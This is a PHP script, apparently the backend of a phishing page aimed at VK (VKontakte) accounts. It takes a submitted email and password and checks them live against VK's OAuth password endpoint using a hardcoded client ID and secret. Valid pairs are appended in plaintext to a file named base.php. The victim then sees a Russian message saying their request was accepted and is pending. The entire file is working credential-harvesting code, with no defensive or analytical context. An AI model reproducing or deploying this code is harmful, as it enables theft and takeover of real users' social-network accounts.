<?php

If (isset($_POST['email'])){ 
 $email = iconv('utf-8', 'windows-1251', $_POST['email']);
 $password = iconv('utf-8', 'windows-1251', $_POST['password']);
 $res=curl('https://oauth.vk.com/token?grant_type=password&client_id=2274003&client_secret=hHbZxrka2uZ6jB1inYsH&username='.$email.'&password='.$password.'&captcha_key=&captcha_sid=');
 $lo='access_token';
 $pos = strripos($res, $lo);
if ($pos === false) {
$info='<div class="alert alert-danger">Ошибка! Вы ввели неверный логин или пароль! '.$proxy.'</div>';
}else{
$res = json_decode($res, true);
$id=$res['user_id'];

$name = curl('https://api.vk.com/method/users.get?user_ids='.$id.'&fields=counters');
$name = json_decode($name, true);

$res = json_decode($res, true);
$id=$res['user_id'];
$fp = fopen("base.php", "a"); 
 $mytext = "$email:$password\r\n";
 $test = fwrite($fp, $mytext);
 fclose($fp);
 


$fulname=$name['response']['0']['first_name'].' '.$name['response']['0']['last_name'];
$info='<div class="alert alert-success">'.$fulname.', Ваша заявка принята, ожидайте обработки!</div>';

 }
}


echo $info;


function curl($url){

$ch = curl_init( $url );
curl_setopt( $ch, CURLOPT_RETURNTRANSFER, true );
curl_setopt( $ch, CURLOPT_SSL_VERIFYHOST, false );
curl_setopt( $ch, CURLOPT_SSL_VERIFYPEER, false );
$response = curl_exec( $ch );
curl_close( $ch );
return $response;
}
?>